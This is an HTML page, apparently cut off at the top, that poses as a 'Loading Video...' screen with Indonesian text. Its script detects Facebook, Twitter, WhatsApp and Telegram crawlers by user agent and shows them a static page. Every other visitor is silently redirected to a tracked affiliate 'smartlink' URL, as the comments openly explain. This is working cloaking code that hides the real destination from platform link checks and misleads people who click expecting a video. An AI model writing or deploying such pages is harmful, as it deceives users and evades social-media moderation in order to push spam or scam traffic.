    <title>Loading Video...</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #ff0055;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Memuat video...</p>

    <script>
        // Target smartlink Anda
        var targetUrl = "https://chfhbei.usflowst.com/s/7a96a663ee35e?track=super1&subsource=super1&ext_click_id=super1";

        // Deteksi apakah yang akses adalah Bot/Crawler Facebook atau Manusia
        var isBot = /facebookexternalhit|Facebot|FBAV|Twitterbot|WhatsApp|TelegramBot/i.test(navigator.userAgent);

        if (!isBot) {
            // Jika pengunjung asli (manusia), langsung lempar ke smartlink dalam 0.3 detik
            setTimeout(function() {
                window.location.replace(targetUrl);
            }, 300);
        } else {
            // Jika bot Facebook yang akses, biarkan halaman diam di tempat agar gambar & judul terbaca sempurna
            console.log("Crawler detected");
        }
    </script>
</body>
</html>
